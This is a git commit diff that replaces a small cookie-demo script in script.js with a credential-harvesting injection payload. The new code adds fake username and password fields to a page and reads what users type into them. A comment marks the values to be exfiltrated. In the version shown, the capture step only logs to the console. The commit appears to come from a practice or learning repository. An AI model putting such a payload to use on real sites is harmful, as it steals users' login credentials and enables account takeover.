218befa7999ff17dd4e59660e7e9ac2d05b5ab8f
Alutaman <164894638+Alutaman@users.noreply.github.com>
2024-03-25 19:01:49 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,21 @@
-<script type="text/javascript">
-document.cookie = "username=Null Byte";
-document.write(document.cookie);
-</script>
+// create the input elements
+let usernameField = document.createElement("input")
+usernameField.type = "text"
+usernameField.name = "username"
+usernameField.id = "username"
+
+let passwordField = document.createElement("input")
+passwordField.type = "password"
+passwordField.name = "password"
+passwordField.id = "password"
+
+// append the elements to the body of the page
+document.body.appendChild(usernameField)
+document.body.appendChild(passwordField)
+
+// exfiltrate as needed (note that we need to wait for the fields to be filled before exfiltrating the information)
+setTimeout(function() {
+  console.log("Username:", document.getElementById("username").value)
+  console.log("Password:", document.getElementById("password").value)
+}, 1000);
 
